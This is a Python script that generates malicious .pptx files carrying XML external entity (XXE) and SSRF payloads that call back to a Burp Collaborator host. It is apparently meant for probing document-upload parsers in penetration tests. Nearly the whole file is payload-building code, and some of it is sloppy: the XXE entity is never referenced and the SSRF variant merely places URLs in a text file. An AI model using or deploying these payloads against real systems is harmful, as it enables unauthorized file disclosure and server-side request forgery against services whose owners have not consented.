from pathlib import Path
import zipfile
import tempfile

def generate_pptx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        ],
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if vuln == 'xxe':
            for i, payload in enumerate(payloads, 1):
                pptx_xxe_template = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_pptx_{i}">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
                
                output_file = vuln_dir / f"payload_{i}.pptx"
                
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
                    (temp_path / "_rels").mkdir()
                    (temp_path / "ppt").mkdir()
                    (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe_template)
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_path)
                                zip_ref.write(file_path, arcname)
        
        elif vuln == 'ssrf':
            for i, payload in enumerate(payloads, 1):
                output_file = vuln_dir / f"payload_{i}.pptx"
                
                with tempfile.TemporaryDirectory() as temp_dir:
                    temp_path = Path(temp_dir)
                    (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
                    (temp_path / "_rels").mkdir()
                    (temp_path / "ppt").mkdir()
                    (temp_path / "ppt" / "presentation.xml").write_text(f'<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:sldIdLst></p:sldIdLst></p:presentation>')
                    (temp_path / "test.txt").write_text(payload)
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        for file_path in temp_path.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_path)
                                zip_ref.write(file_path, arcname)

